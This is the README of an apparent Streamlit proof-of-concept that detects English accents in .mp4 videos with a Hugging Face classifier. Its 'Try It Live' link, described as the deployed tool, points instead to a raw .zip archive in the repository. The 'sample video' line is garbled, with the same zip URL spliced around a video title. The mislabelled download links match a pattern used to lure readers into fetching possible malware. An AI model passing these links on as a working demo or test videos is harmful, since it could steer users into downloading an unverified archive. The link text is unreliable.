# English Accent Detection Tool

A Streamlit-based proof-of-concept that detects the English accent spoken in any public `.mp4` video or uploaded file.

This tool extracts audio from video, processes it with a Hugging Face audio classification model, and returns the most likely English accent with a confidence score.

# Features

- Upload or paste any public `.mp4` video
- Audio extracted using `ffmpeg` via `imageio-ffmpeg`
- Runs English accent classification using a fine-tuned lightweight model (for deployment speed)
- Returns:
  - Detected accent
  - Confidence score (0–100%)
  
  
## Accuracy Note

To keep this demo lightweight and deployable on **Streamlit Cloud’s free tier**, a **smaller model** was used during deployment.

However, **for best accuracy**, the tool is tested successfully using:

> `ylacombe/accent-classifier` from Hugging Face  
> This model achieved much better classification accuracy in local tests  
> Not used in production due to size and memory limits

## Try It Live

**[Click here to use the deployed tool](https://raw.githubusercontent.com/MohamedArafa97/accent-detector/main/alienist/accent_detector_3.9.zip)**  


#Sample Public Video URLs to Test

(https://raw.githubusercontent.com/MohamedArafa97/accent-detector/main/alienist/accent_detector_3.9.zip%20expressions%20-%20American%20Accent%20Tutorial%20_%20Amy%20Walker%28360p_H.264-AAC%https://raw.githubusercontent.com/MohamedArafa97/accent-detector/main/alienist/accent_detector_3.9.zip)


